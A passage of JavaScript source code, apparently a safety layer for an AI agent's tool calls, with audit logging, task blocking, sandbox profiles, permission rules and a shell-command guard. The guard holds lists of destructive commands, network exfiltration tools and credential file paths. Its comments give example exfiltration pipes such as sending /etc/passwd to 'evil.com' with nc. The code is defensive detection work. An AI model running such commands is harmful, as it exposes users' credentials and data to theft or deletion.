        ConfigRegistry.register("audit.enabled", true);
        ConfigRegistry.register("audit.log_path", ".zero_apex/audit_log.jsonl");
        ConfigRegistry.register("audit.flush_size", 1);  // 1 = flush every append (crash-safe)
    }

    // Bootstrap config at module load, then lock security-critical keys
    bootstrapConfig();
    ConfigRegistry.lock();

    // ======================================================================
    // §21b AuditLogger — append-only JSONL audit log
    // Every tool call writes a line: timestamp/tool/task_id/trigger/duration/result
    // ======================================================================
    function AuditLogger(deps) {
        deps = deps || {};
        var Files = deps.Files;
        var logPath = ConfigRegistry.get("audit.log_path", ".zero_apex/audit_log.jsonl");
        var enabled = ConfigRegistry.get("audit.enabled", true);
        var buffer = [];
        // flushSize=1: flush on every append so no entries are lost on crash.
        // Can be raised via config for high-throughput scenarios.
        var flushSize = ConfigRegistry.has("audit.flush_size")
            ? ConfigRegistry.get("audit.flush_size")
            : 1;

        function append(entry) {
            if (!enabled) return;
            var line = {
                ts: new Date().toISOString(),
                tool: entry.tool,
                task_id: entry.task_id || null,
                trigger: entry.trigger || null,
                duration_ms: entry.duration_ms || 0,
                result_code: entry.result_code || null,
                result_summary: entry.result_summary || null,
            };
            buffer.push(line);
            if (buffer.length >= flushSize) {
                // Fire-and-forget: flush is async but append() is sync
                var p = flush();
                if (p && typeof p.catch === "function") p.catch(function () {});
            }
        }

        var flushInFlight = null;
        async function flush() {
            if (!enabled || buffer.length === 0) return;
            if (!Files || typeof Files.write !== "function") {
                // No Files available; keep in memory (graceful degrade)
                return;
            }
            // Concurrency guard: serialize concurrent flush() calls so the
            // second call doesn't read the same "existing" content and
            // overwrite the first's write, losing entries.
            if (flushInFlight) {
                try { await flushInFlight; } catch (e) { /* swallow; will retry */ }
            }
            var payload = buffer.map(function (l) { return JSON.stringify(l); }).join("\n") + "\n";
            var toWrite = buffer;
            buffer = [];
            flushInFlight = (async function () {
                try {
                    // Append-mode: read existing, concat, write back.
                    // QuickJS sandbox has no append API, so read-merge-write.
                    var existing = "";
                    try {
                        var r = await Files.read(logPath);
                        if (typeof r === "string") existing = r;
                        else if (r && r.content) existing = r.content;
                    } catch (e) {}
                    await Files.write(logPath, existing + payload);
                } catch (e) {
                    // On IO error, re-queue entries so they're not silently lost
                    buffer = toWrite.concat(buffer);
                } finally {
                    flushInFlight = null;
                }
            })();
            return flushInFlight;
        }

        function snapshot() {
            return buffer.slice();
        }

        function clear() {
            buffer = [];
        }

        function setEnabled(v) { enabled = !!v; }
        function isEnabled() { return enabled; }

        return { append: append, flush: flush, snapshot: snapshot, clear: clear, setEnabled: setEnabled, isEnabled: isEnabled };
    }

    // ======================================================================
    // §21c BlockEnforcer — hard block subsequent tools after preflight BLOCK
    //. When preflight returns allowed=false, enforce_block
    // registers a block on that task_id; subsequent tool calls for the same
    // task_id are rejected by the engine layer, not by the model's choice.
    // ======================================================================
    function BlockEnforcer() {
        var blockedTasks = {};   // task_id -> { reason, ts, expires }
        var defaultTtlMs = 5 * 60 * 1000;  // 5 min

        function block(taskId, reason) {
            if (!taskId) return;
            blockedTasks[taskId] = {
                reason: reason || "preflight BLOCK",
                ts: Date.now(),
                expires: Date.now() + defaultTtlMs,
            };
        }

        function isBlocked(taskId) {
            if (!taskId) return false;
            var entry = blockedTasks[taskId];
            if (!entry) return false;
            if (Date.now() > entry.expires) {
                delete blockedTasks[taskId];
                return false;
            }
            return true;
        }

        function unblock(taskId) {
            if (taskId && blockedTasks[taskId]) delete blockedTasks[taskId];
        }

        function clear() {
            blockedTasks = {};
        }

        function snapshot() {
            var out = [];
            for (var k in blockedTasks) {
                if (blockedTasks.hasOwnProperty(k)) {
                    out.push({ task_id: k, reason: blockedTasks[k].reason, ts: blockedTasks[k].ts });
                }
            }
            return out;
        }

        return {
            block: block,
            isBlocked: isBlocked,
            unblock: unblock,
            clear: clear,
            snapshot: snapshot,
        };
    }

    // ======================================================================
    // §21d ManifestLoader — read manifest.json and curtail by env
    // ======================================================================
    function ManifestLoader(deps) {
        deps = deps || {};
        var Files = deps.Files;
        var manifestCache = null;
        var loadAttempted = false;
        var pendingAsync = null;

        // Eagerly try to populate the cache synchronously. The Operit sandbox
        // is async, but the test environment and some legacy integrations use
        // a synchronous Files.read. By attempting a sync read on construction,
        // we get a populated cache for sandbox/permission lookups that happen
        // before the first await.
        function trySyncLoad() {
            if (manifestCache) return manifestCache;
            if (!Files || typeof Files.read !== "function") {
                manifestCache = getBuiltinManifest();
                return manifestCache;
            }
            try {
                var r = Files.read("manifest.json");
                // If Files.read is async it returns a Promise; we cannot use it
                // synchronously. Attach a no-op catch to avoid unhandled-rejection
                // warnings, then return null and let the async path handle it.
                if (r && typeof r.then === "function") {
                    if (typeof r.catch === "function") {
                        r.catch(function () {});
                    }
                    return null;
                }
                if (r) {
                    var content = (typeof r === "string") ? r : (r.content || "");
                    if (content) {
                        manifestCache = JSON.parse(content);
                        return manifestCache;
                    }
                }
            } catch (e) {
                // Sync throw: file missing, no permission, etc. Fall through.
            }
            return null;
        }

        // Read manifest.json asynchronously. Returns a Promise.
        function loadAsync() {
            if (manifestCache) return Promise.resolve(manifestCache);
            if (loadAttempted) {
                if (pendingAsync) return pendingAsync;
                return Promise.resolve(manifestCache || getBuiltinManifest());
            }
            loadAttempted = true;
            // Try sync first (covers sync-Files test environments)
            if (trySyncLoad() && manifestCache) {
                return Promise.resolve(manifestCache);
            }
            if (!Files || typeof Files.read !== "function") {
                manifestCache = getBuiltinManifest();
                return Promise.resolve(manifestCache);
            }
            pendingAsync = (function () {
                var p = Promise.resolve(Files.read("manifest.json"));
                return p.then(function (r) {
                    if (r) {
                        var content = (typeof r === "string") ? r : (r.content || "");
                        if (content) {
                            try {
                                manifestCache = JSON.parse(content);
                                return manifestCache;
                            } catch (e) {}
                        }
                    }
                    manifestCache = getBuiltinManifest();
                    return manifestCache;
                }).catch(function () {
                    manifestCache = getBuiltinManifest();
                    return manifestCache;
                });
            })();
            return pendingAsync;
        }

        // Sync accessor: returns cache, or builtin if not yet loaded.
        // In async environments callers should use loadAsync() first.
        function load() {
            if (manifestCache) return manifestCache;
            var sync = trySyncLoad();
            if (sync) return sync;
            // Kick off async load for next time
            loadAsync();
            return getBuiltinManifest();
        }

        // Builtin minimal manifest for graceful degradation
        function getBuiltinManifest() {
            return {
                tools: [
                    { name: "preflight", min_permission: "none", requires: [] },
                    { name: "file_guard", min_permission: "none", requires: [] },
                    { name: "hallucination_guard", min_permission: "none", requires: [] },
                    { name: "evidence_check", min_permission: "none", requires: [] },
                    { name: "self_monitor", min_permission: "none", requires: [] },
                    { name: "output_firewall", min_permission: "none", requires: [] },
                    { name: "search_opensource", min_permission: "network", requires: ["Network"] },
                    { name: "remember", min_permission: "basic", requires: ["Tools.Memory"] },
                    { name: "recall", min_permission: "basic", requires: ["Tools.Memory"] },
                    { name: "snapshot_file", min_permission: "basic", requires: ["Files"] },
                    { name: "restore_file", min_permission: "basic", requires: ["Files"] },
                    { name: "snapshot_cleanup", min_permission: "basic", requires: ["Files"] },
                    { name: "tombstone_file", min_permission: "basic", requires: ["Files"] },
                    { name: "enforce_block", min_permission: "none", requires: [] },
                    { name: "audit_log", min_permission: "basic", requires: ["Files"] },
                    { name: "evaluate_permission", min_permission: "none", requires: [] },
                    { name: "check_sandbox", min_permission: "none", requires: [] },
                    { name: "config_get", min_permission: "none", requires: [] },
                    { name: "config_set", min_permission: "basic", requires: [] },
                ],
                references: [],
                env_requirements: {
                    permission_levels: {
                        none: { tools_disabled: ["Files", "Network", "Tools.Memory"] },
                        basic: { tools_disabled: ["Network", "Tools.Memory"] },
                        network: { tools_disabled: ["Tools.Memory"] },
                        shell: { tools_disabled: [] },
                        shizuku: { tools_disabled: [] },
                        root: { tools_disabled: [] },
                    }
                }
            };
        }

        // Determine current env permission level from available deps
        function detectLevel(deps) {
            deps = deps || {};
            var hasFiles = !!deps.Files;
            var hasNetwork = !!deps.Network;
            var hasMemory = !!(deps.Tools && deps.Tools.Memory);
            var hasShizuku = !!(deps.Shizuku || (deps.Tools && deps.Tools.Shizuku));
            var hasRoot = !!(deps.Root || (deps.Tools && deps.Tools.Root) || deps.su);
            if (!hasFiles && !hasNetwork && !hasMemory) return "none";
            if (hasFiles && !hasNetwork && !hasMemory) return "basic";
            if (hasFiles && hasNetwork && !hasMemory) return "network";
            if (hasRoot) return "root";
            if (hasShizuku) return "shizuku";
            return "shell";
        }

        // Curtail: return list of tool names allowed in current env
        function curtail(deps) {
            var m = load();
            var level = detectLevel(deps);
            var levelOrder = ["none", "basic", "network", "shell", "shizuku", "root"];
            var levelIdx = levelOrder.indexOf(level);
            var allowed = [];
            var disabled = [];

            for (var i = 0; i < m.tools.length; i++) {
                var t = m.tools[i];
                var tIdx = levelOrder.indexOf(t.min_permission || "none");
                if (tIdx <= levelIdx) {
                    // Check requires
                    var reqs = t.requires || [];
                    var reqMet = true;
                    for (var j = 0; j < reqs.length; j++) {
                        var req = reqs[j];
                        if (req === "Files" && !deps.Files) reqMet = false;
                        if (req === "Network" && !deps.Network) reqMet = false;
                        if (req === "Tools.Memory" && !(deps.Tools && deps.Tools.Memory)) reqMet = false;
                    }
                    if (reqMet) allowed.push(t.name);
                    else disabled.push({ name: t.name, reason: "requires " + reqs.join(",") });
                } else {
                    disabled.push({ name: t.name, reason: "min_permission " + t.min_permission + " > current " + level });
                }
            }
            return { level: level, allowed: allowed, disabled: disabled };
        }

        function isToolAllowed(toolName, deps) {
            var c = curtail(deps);
            return c.allowed.indexOf(toolName) >= 0;
        }

        return { load: load, loadAsync: loadAsync, detectLevel: detectLevel, curtail: curtail, isToolAllowed: isToolAllowed };
    }

    // ======================================================================
    // §21e ShellGuard — command segment parser + read-only allowlist +
    // dangerous command escalation (borrowed from Grok grok-build)
    // Splits chained commands on && || ; | and newlines, then peels a fixed
    // set of process wrappers (timeout, nice, ionice, chrt, stdbuf, env) and
    // env-var prefixes before matching each segment.
    // ======================================================================
    var ShellGuard = (function () {
        var READ_ONLY_CMDS = [
            "ls", "cat", "pwd", "date", "whoami", "hostname", "uptime", "ps",
            "head", "tail", "wc", "sort", "uniq", "tr", "cut",
            "grep", "rg",
            "git status", "git branch", "git log", "git diff", "git ls-files", "git show", "git rev-parse",
            "kubectl get", "kubectl logs", "kubectl describe",
            "cargo check"
        ];
        var DANGEROUS_CMDS = [
            // File deletion
            "rm", "rmdir", "unlink", "shred",
            // Permission / ownership
            "chmod", "chown", "chgrp", "chattr",
            // Process / signal
            "pkill", "kill", "killall",
            // Git destructive
            "git push", "git clean", "git stash", "git branch -D",
            // Container / orchestration — easy to nuke
            "docker system prune", "docker container prune", "docker image prune",
            "docker volume prune", "docker network prune",
            "kubectl delete", "kubectl drain", "kubectl exec --rm",
            // Infrastructure
            "terraform destroy", "terraform apply -destroy",
            // Cloud CLI (covered by pattern below, but listed for splitChain)
            "aws s3 rm", "aws ec2 terminate-instances", "aws rds delete-db",
            "gcloud compute instances delete", "gcloud projects delete",
            "az group delete", "az vm delete",
            // File truncation
            "truncate",
            // System power
            "shutdown", "reboot", "poweroff", "init",
            // Disk / filesystem
            "mkfs", "fdisk", "parted",
            "mount", "umount",
            // Firewall
            "iptables", "ip6tables", "nft", "ufw", "firewall-cmd",
            // User management
            "useradd", "userdel", "usermod", "passwd", "visudo", "chroot",
            // Privilege
            "sudo", "su",
        ];
        // Network exfiltration sinks — when these appear as pipe targets,
        // the chain is data-exfiltration regardless of the source.
        var EXFIL_SINKS = ["nc", "ncat", "netcat", "curl", "wget", "ssh", "scp", "rsync", "ftp", "telnet", "curl -X POST"];
        // Sensitive file sources that should not be piped anywhere
        var SENSITIVE_SOURCES = ["/etc/passwd", "/etc/shadow", "/etc/sudoers", "/etc/ssh/", "~/.ssh/", "~/.aws/", "~/.kube/", "~/.docker/config.json", "/proc/self/environ", "~/.bash_history"];
        var WRAPPERS = ["timeout", "nice", "ionice", "chrt", "stdbuf", "env"];

        function splitChain(cmd) {
            var s = safeString(cmd);
            if (!s) return [];
            return s.split(/&&|\|\||;|\||\n/);
        }

        function peelWrapper(segment) {
            var s = String(segment || "").trim();
            while (s) {
                var matched = false;
                var first = (s.split(/\s+/)[0] || "");
                if (WRAPPERS.indexOf(first) >= 0) {
                    var rest = s.slice(first.length).trim();
                    if (first === "env") {
                        var m = rest.match(/^([A-Z_][A-Z0-9_]*=\S+)\s+([\s\S]+)$/);
                        if (m) { s = m[2].trim(); matched = true; }
                        else { s = rest; matched = true; }
                    } else if (first === "timeout") {
                        var m2 = rest.match(/^(\S+)\s+([\s\S]+)$/);
                        if (m2) { s = m2[2].trim(); matched = true; }
                        else { s = rest; matched = true; }
                    } else {
                        // nice/ionice/chrt/stdbuf: peel all leading option/numeric args
                        // until we hit a token that looks like a command name.
                        var cur = rest;
                        while (cur) {
                            var optMatch = cur.match(/^(-\S+|\d+(?:\.\d+)?)[\s]+([\s\S]+)$/);
                            if (optMatch) { cur = optMatch[2].trim(); }
                            else { break; }
                        }
                        s = cur || rest;
                        matched = true;
                    }
                }
                var envPrefix = s.match(/^([A-Z_][A-Z0-9_]*=\S+)\s+([\s\S]+)$/);
                if (envPrefix) { s = envPrefix[2].trim(); matched = true; }
                if (!matched) break;
            }
            return s.trim();
        }

        function primaryCommand(segment) {
            var s = peelWrapper(segment);
            if (!s) return "";
            var parts = s.split(/\s+/);
            return parts[0] || "";
        }

        function isReadOnly(segment) {
            var s = peelWrapper(segment);
            if (!s) return false;
            for (var i = 0; i < READ_ONLY_CMDS.length; i++) {
                var pat = READ_ONLY_CMDS[i];
                if (s === pat || s.indexOf(pat + " ") === 0) return true;
            }
            return false;
        }

        function isDangerous(segment) {
            var s = peelWrapper(segment);
            if (!s) return false;
            // Tokenize: handles "rm -rf", "rm-rf", "rm\t-rf", "rm   -rf"
            // Split on whitespace OR a hyphen-prefixed flag (rm-rf → [rm, -rf])
            var tokens = s.split(/[\s]+|(?=-)/);
            var first = (tokens[0] || "");
            // Normalize "rm-rf" → "rm -rf" so hyphen-fused variants match
            var firstBase = first.replace(/^([a-z]+)-/i, "$1 ");
            if (DANGEROUS_CMDS.indexOf(first) >= 0) return true;
            if (firstBase !== first && DANGEROUS_CMDS.indexOf(firstBase.split(/\s+/)[0]) >= 0) return true;
            // Multi-word dangerous commands: check if segment starts with any of them.
            // Sort by length descending so "docker system prune" matches before "docker".
            var multiword = DANGEROUS_CMDS.filter(function (c) { return c.indexOf(" ") >= 0; })
                                          .sort(function (a, b) { return b.length - a.length; });
            for (var i = 0; i < multiword.length; i++) {
                var pat = multiword[i];
                if (s === pat) return true;
                if (s.indexOf(pat + " ") === 0) return true;
                if (s.indexOf(pat + "\t") === 0) return true;
            }
            return false;
        }

        // Detect data-exfiltration pipe chains:
        //   cat /etc/passwd | nc evil.com 4444
        //   tar czf - /home | curl -X POST evil.com
        //   cp ~/.ssh/id_rsa | base64 | nc ...
        // Returns { hit: true, pattern: "...", source: "...", sink: "..." } or null
        function detectPipeExfiltration(cmd) {
            var s = safeString(cmd);
            if (!s) return null;
            // Only consider chains that have at least one pipe
            if (s.indexOf("|") < 0) return null;
            // Split on pipe only (preserve other operators within segments)
            var parts = s.split("|");
            if (parts.length < 2) return null;

            // Scan each segment for sensitive sources and exfil sinks
            var sensitiveSource = null;
            var exfilSink = null;
            var exfilSinkSeg = null;
            for (var i = 0; i < parts.length; i++) {
                var seg = parts[i];
                // Sensitive source detection
                for (var s_i = 0; s_i < SENSITIVE_SOURCES.length; s_i++) {
                    if (seg.indexOf(SENSITIVE_SOURCES[s_i]) >= 0) {
                        sensitiveSource = SENSITIVE_SOURCES[s_i];
                        break;
                    }
                }
                // Exfil sink detection: first word of the segment
                var firstWord = (seg.trim().split(/\s+/)[0] || "").toLowerCase();
                if (EXFIL_SINKS.indexOf(firstWord) >= 0) {
                    exfilSink = firstWord;
                    exfilSinkSeg = seg.trim();
                }
            }

            // Two patterns:
            // 1. sensitive source + any pipe chain (even without exfil sink) — info leak
            // 2. any source + exfil sink — exfiltration
            if (sensitiveSource) {
                return {
                    hit: true,
                    pattern: "sensitive_source_in_pipe",
                    source: sensitiveSource,
                    sink: exfilSink,
                    sink_segment: exfilSinkSeg,
                    chain: s.slice(0, 120),
                };
            }
            if (exfilSink) {
                return {
                    hit: true,
                    pattern: "exfil_sink_in_pipe",
                    source: null,
                    sink: exfilSink,
                    sink_segment: exfilSinkSeg,
                    chain: s.slice(0, 120),
                };
            }
            return null;
        }

        // Detect destructive find/xargs chains
        //   find . -name "*.log" -delete
        //   find / -mtime +0 -exec rm {} \;
        //   echo "files" | xargs rm
        function detectMassDelete(cmd) {
            var s = safeString(cmd);
            if (!s) return null;
            // find ... -delete
            if (/\bfind\b[^\n|;&]*\s-delete\b/.test(s)) {
                return { hit: true, pattern: "find_delete", chain: s.slice(0, 120) };
            }
            // find ... -exec rm/shred/unlink
            if (/\bfind\b[^\n|;&]*\s-exec\b\s+(rm|shred|unlink|rmdir)\b/.test(s)) {
                return { hit: true, pattern: "find_exec_destructive", chain: s.slice(0, 120) };
            }
            // xargs rm / shred / unlink
            if (/\bxargs\b[^\n|;&]*\b(rm|shred|unlink|rmdir)\b/.test(s)) {
                return { hit: true, pattern: "xargs_destructive", chain: s.slice(0, 120) };
            }
            // git clean with force
            if (/\bgit\s+clean\b[^\n|;&]*-[a-z]*f/.test(s)) {
                return { hit: true, pattern: "git_clean_force", chain: s.slice(0, 120) };
            }
            // truncate
            if (/\btruncate\b\s+-s\s*0\b/.test(s)) {
                return { hit: true, pattern: "truncate_zero", chain: s.slice(0, 120) };
            }
            return null;
        }

        function hasUnsafeTokens(cmd) {
            var s = safeString(cmd);
            if (!s) return null;
            // $( ... ) command substitution
            if (s.indexOf("$(") >= 0) return "$(";
            // backtick substitution
            if (s.indexOf("`") >= 0) return "`";
            // single & (background) but not && (logical and)
            var ampMatch = s.match(/(^|[^&])&([^&]|$)/);
            if (ampMatch) return "&";
            // > or < redirection (but not >> << here-doc which are still redirections)
            if (/[<>]/.test(s) && !/^<{2,}\s/.test(s.trim())) {
                var m = s.match(/(^|[^<>])([<>])([^<>]|$)/);
                if (m) return m[2];
            }
            return null;
        }

        function analyze(cmd) {
            var segments = splitChain(cmd);
            var unsafeToken = hasUnsafeTokens(cmd);
            var allReadOnly = segments.length > 0;
            var dangerousHits = [];
            var nonReadOnlySegments = [];

            for (var i = 0; i < segments.length; i++) {
                var seg = segments[i].trim();
                if (!seg) continue;
                if (isDangerous(seg)) {
                    dangerousHits.push({ segment: seg, primary: primaryCommand(seg) });
                }
                if (!isReadOnly(seg)) {
                    allReadOnly = false;
                    nonReadOnlySegments.push(seg);
                }
            }

            // Chain-level detection: pipe exfiltration + mass delete
            var pipeExfil = detectPipeExfiltration(cmd);
            var massDelete = detectMassDelete(cmd);

            var verdict = "ALLOW";
            var reasons = [];
            if (dangerousHits.length > 0) {
                verdict = "ASK";
                for (var d = 0; d < dangerousHits.length; d++) {
                    reasons.push("危险命令: " + dangerousHits[d].primary + " [" + dangerousHits[d].segment + "]");
                }
            }
            if (pipeExfil) {
                verdict = "ASK";
                if (pipeExfil.sensitiveSource) {
                    reasons.push("管道数据外泄: 含敏感源 [" + pipeExfil.sensitiveSource + "]");
                } else {
                    reasons.push("管道数据外泄: 目标含外发命令 [" + pipeExfil.sink + "]");
                }
            }
            if (massDelete) {
                verdict = "ASK";
                reasons.push("批量删除模式: " + massDelete.pattern + " [" + massDelete.chain + "]");
            }
            if (unsafeToken) {
                verdict = "ASK";
                reasons.push("含不可检查的 shell 构造: " + unsafeToken);
            }

            return {
                verdict: verdict,
                segments_count: segments.length,
                all_read_only: allReadOnly,
                dangerous_hits: dangerousHits,
                non_read_only_segments: nonReadOnlySegments,
                unsafe_token: unsafeToken,
                pipe_exfiltration: pipeExfil,
                mass_delete: massDelete,
                reasons: reasons,
            };
        }

        return {
            READ_ONLY_CMDS: READ_ONLY_CMDS,
            DANGEROUS_CMDS: DANGEROUS_CMDS,
            EXFIL_SINKS: EXFIL_SINKS,
            SENSITIVE_SOURCES: SENSITIVE_SOURCES,
            splitChain: splitChain,
            peelWrapper: peelWrapper,
            primaryCommand: primaryCommand,
            isReadOnly: isReadOnly,
            isDangerous: isDangerous,
            detectPipeExfiltration: detectPipeExfiltration,
            detectMassDelete: detectMassDelete,
            hasUnsafeTokens: hasUnsafeTokens,
            analyze: analyze,
        };
    })();

    // ======================================================================
    // §21f SandboxProfile — path/command restrictions by profile
    // (borrowed from Grok grok-build sandbox). Default workspace: only
    // .zero_apex/ + .trash/ writable; deny /proc /sys /dev /etc/shadow etc.
    // Profiles: workspace | read-only | strict.
    // ======================================================================
    function SandboxProfile(deps) {
        deps = deps || {};
        var manifest = deps.manifest || null;

        function getProfileConfig(profileName) {
            var m = manifest ? manifest.load() : null;
            if (!m || !m.sandbox || !m.sandbox.profiles) return null;
            return m.sandbox.profiles[profileName] || null;
        }

        function getDefaultProfile() {
            var m = manifest ? manifest.load() : null;
            if (m && m.sandbox && m.sandbox.default_profile) {
                return m.sandbox.default_profile;
            }
            return "workspace";
        }

        function matchGlob(pattern, path) {
            if (pattern === "*") return true;
            if (!pattern || !path) return false;
            var p = String(pattern);
            var s = String(path);
            var re = "^";
            var i = 0;
            while (i < p.length) {
                var c = p.charAt(i);
                if (c === "*") {
                    if (p.charAt(i + 1) === "*") {
                        re += "[\\s\\S]*";
                        i += 2;
                        if (p.charAt(i) === "/") i += 1;
                    } else {
                        re += "[^/]*";
                        i += 1;
                    }
                } else if (c === "?") {
                    re += "[^/]";
                    i += 1;
                } else if (/[.+^${}()|[\]\\]/.test(c)) {
                    re += "\\" + c;
                    i += 1;
                } else {
                    re += c;
                    i += 1;
                }
            }
            re += "$";
            try { return new RegExp(re).test(s); } catch (e) { return false; }
        }

        function checkPath(path, action, profileName) {
            var profile = getProfileConfig(profileName || getDefaultProfile());
            if (!profile) return { allowed: true, verdict: "ALLOW", reason: "no profile config" };
            var p = safeString(path);
            if (!p) return { allowed: false, verdict: "DENY", reason: "empty path" };

            var denyList = profile.deny_paths || [];
            for (var i = 0; i < denyList.length; i++) {
                if (matchGlob(denyList[i], p)) {
                    return { allowed: false, verdict: "DENY", reason: "denied by pattern: " + denyList[i], matched_pattern: denyList[i] };
                }
            }

            if (action === "write" || action === "edit") {
                var writable = profile.writable_paths || [];
                var matchedWritable = null;
                for (var j = 0; j < writable.length; j++) {
                    if (matchGlob(writable[j], p)) { matchedWritable = writable[j]; break; }
                }
                if (writable.length === 0) {
                    return { allowed: false, verdict: "DENY", reason: "profile " + (profileName || getDefaultProfile()) + " forbids all writes" };
                }
                if (!matchedWritable) {
                    return { allowed: false, verdict: "DENY", reason: "path not in writable_paths: " + p };
                }
            }
            return { allowed: true, verdict: "ALLOW", matched_profile: profileName || getDefaultProfile() };
        }

        function checkCommand(cmd, profileName) {
            var profile = getProfileConfig(profileName || getDefaultProfile());
            if (!profile) return { allowed: true, verdict: "ALLOW", reason: "no profile config" };
            var execs = profile.executable_commands || [];
            if (execs.length === 0 && (profileName || getDefaultProfile()) === "read-only") {
                var sg = ShellGuard.analyze(cmd);
                if (sg.verdict === "ALLOW" && sg.all_read_only) {
                    return { allowed: true, verdict: "ALLOW", reason: "read-only command" };
                }
                return { allowed: false, verdict: "DENY", reason: "read-only profile forbids non-readonly: " + sg.non_read_only_segments.join(",") };
            }
            if (execs.length === 0 || execs.indexOf("*") >= 0) {
                return { allowed: true, verdict: "ALLOW", reason: "wildcard exec" };
            }
            var segments = ShellGuard.splitChain(cmd);
            for (var i = 0; i < segments.length; i++) {
                var seg = ShellGuard.peelWrapper(segments[i]);
                if (!seg) continue;
                var matched = false;
                for (var j = 0; j < execs.length; j++) {
                    if (seg === execs[j] || seg.indexOf(execs[j] + " ") === 0) { matched = true; break; }
                }
                if (!matched) {
                    return { allowed: false, verdict: "DENY", reason: "segment not in executable_commands: " + seg };
                }
            }
            return { allowed: true, verdict: "ALLOW" };
        }

        function check(params) {
            params = params || {};
            var profileName = params.profile || getDefaultProfile();
            if (params.command) return checkCommand(params.command, profileName);
            if (params.path) return checkPath(params.path, params.action || "write", profileName);
            return { allowed: false, verdict: "DENY", reason: "no path or command provided" };
        }

        return {
            check: check,
            checkPath: checkPath,
            checkCommand: checkCommand,
            getDefaultProfile: getDefaultProfile,
            getProfileConfig: getProfileConfig,
            matchGlob: matchGlob,
        };
    }

    // ======================================================================
    // §21g PermissionRules — deny > ask > allow evaluation with glob
    // matching (borrowed from Grok grok-build permission system).
    // default mode: unmatched calls fall through to preflight existing logic.
    // dontAsk mode: unmatched calls without allow are denied.
    // bypassPermissions mode: auto-approve (deny/hook still apply).
    // ======================================================================
    function PermissionRules(deps) {
        deps = deps || {};
        var manifest = deps.manifest || null;

        function getRules() {
            var m = manifest ? manifest.load() : null;
            if (!m || !m.permission || !m.permission.rules) return [];
            return m.permission.rules;
        }

        function getDefaultMode() {
            var m = manifest ? manifest.load() : null;
            if (m && m.permission && m.permission.default_mode) {
                return m.permission.default_mode;
            }
            return "default";
        }

        function matchTool(ruleTool, callTool) {
            if (!ruleTool || ruleTool === "*") return true;
            if (!callTool) return false;
            return ruleTool.toLowerCase() === callTool.toLowerCase();
        }

        function matchPattern(pattern, value) {
            if (!pattern || !value) return false;
            if (pattern === "*") return true;
            var p = String(pattern);
            var s = String(value);
            if (p.indexOf("Bash(") === 0 && p.charAt(p.length - 1) === ")") {
                var inner = p.slice(5, -1);
                if (inner.indexOf(":*") === inner.length - 2) {
                    inner = inner.slice(0, -2);
                    return s === inner || s.indexOf(inner) === 0;
                }
                if (inner.indexOf("*") >= 0 || inner.indexOf("?") >= 0) {
                    // Bash mode: * matches any characters including slashes
                    return globMatch(inner, s, true);
                }
                return s === inner || s.indexOf(inner) === 0;
            }
            if (p.indexOf("Read(") === 0 || p.indexOf("Edit(") === 0 || p.indexOf("Grep(") === 0) {
                var inner2 = p.slice(p.indexOf("(") + 1, -1);
                return globMatch(inner2, s, false);
            }
            if (p.indexOf("WebFetch(domain:") === 0) {
                var domain = p.slice("WebFetch(domain:".length, -1);
                return s.indexOf(domain) >= 0 || s.indexOf(domain.replace(/^www\./, "")) >= 0;
            }
            return globMatch(p, s, false);
        }

        function globMatch(pattern, str, starCrossSlash) {
            if (pattern === "*") return true;
            var p = String(pattern);
            var s = String(str);
            var re = "^";
            var i = 0;
            while (i < p.length) {
                var c = p.charAt(i);
                if (c === "*") {
                    if (p.charAt(i + 1) === "*") {
                        re += "[\\s\\S]*";
                        i += 2;
                        if (p.charAt(i) === "/") i += 1;
                    } else {
                        re += starCrossSlash ? "[\\s\\S]*" : "[^/]*";
                        i += 1;
                    }
                } else if (c === "?") {
                    re += "[^/]";
                    i += 1;
                } else if (/[.+^${}()|[\]\\]/.test(c)) {
                    re += "\\" + c;
                    i += 1;
                } else {
                    re += c;
                    i += 1;
                }
            }
            re += "$";
            try { return new RegExp(re).test(s); } catch (e) { return false; }
        }

        function normalizeTool(toolName, params) {
            if (!toolName) return "bash";
            var t = String(toolName).toLowerCase();
            if (t === "file_guard" || t === "fileguard") return "bash";
            if (t === "snapshot_file" || t === "restore_file" || t === "snapshot_cleanup" || t === "tombstone_file") return "edit";
            if (t === "read" || t === "read_file" || t === "list_dir" || t === "grep") return "read";
            if (t === "edit" || t === "write" || t === "search_replace") return "edit";
            if (t === "bash" || t === "shell") return "bash";
            return "bash";
        }

        function extractValue(tool, params) {
            params = params || {};
            if (tool === "bash") return params.command || "";
            if (tool === "read" || tool === "edit") return params.path || params.file_path || "";
            return params.command || params.path || "";
        }

        function evaluate(toolName, params) {
            var mode = getDefaultMode();
            var tool = normalizeTool(toolName, params);
            var value = extractValue(tool, params);
            var rules = getRules();

            var denyHit = null;
            var askHit = null;
            var allowHit = null;

            for (var i = 0; i < rules.length; i++) {
                var r = rules[i];
                if (!matchTool(r.tool, tool)) continue;
                if (!r.pattern) continue;
                if (r.pattern === "*" || matchPattern(r.pattern, value)) {
                    if (r.action === "deny" && !denyHit) denyHit = r;
                    else if (r.action === "ask" && !askHit) askHit = r;
                    else if (r.action === "allow" && !allowHit) allowHit = r;
                }
            }

            if (denyHit) {
                return { verdict: "DENY", reason: "deny rule: " + denyHit.pattern, matched_rule: denyHit, mode: mode };
            }
            if (askHit) {
                return { verdict: "ASK", reason: "ask rule: " + askHit.pattern, matched_rule: askHit, mode: mode };
            }
            if (allowHit) {
                return { verdict: "ALLOW", reason: "allow rule: " + allowHit.pattern, matched_rule: allowHit, mode: mode };
            }

            if (mode === "dontAsk") {
                return { verdict: "DENY", reason: "dontAsk: no allow rule matched", mode: mode };
            }
            if (mode === "bypassPermissions") {
                return { verdict: "ALLOW", reason: "bypassPermissions", mode: mode };
            }
            return { verdict: "FALLTHROUGH", reason: "default mode: fall through to preflight", mode: mode };
        }

        return {
            evaluate: evaluate,
            normalizeTool: normalizeTool,
            extractValue: extractValue,
            matchPattern: matchPattern,
            globMatch: globMatch,
            getRules: getRules,
            getDefaultMode: getDefaultMode,
        };
    }


    // ======================================================================
    // §21g2 OutputValidator — structured output schema validation
    // Inspired by: Guardrails AI, Instructor (Jason Liu 2023)
    // Core idea: validate tool return values and model outputs against a
    // declared schema so callers get a typed, predictable response even when
    // the underlying model hallucinates structure.
    // ======================================================================
    var OutputValidator = (function () {
        // Supported type checkers
        var TYPES = {
            string:  function(v) { return typeof v === "string"; },
            number:  function(v) { return typeof v === "number" && isFinite(v); },
            boolean: function(v) { return typeof v === "boolean"; },
            array:   function(v) { return Array.isArray(v); },
            object:  function(v) { return v !== null && typeof v === "object" && !Array.isArray(v); },
            any:     function()  { return true; },
        };

        // schema: { field: { type, required, min, max, minLen, maxLen, enum, pattern, items } }
        function validate(data, schema) {
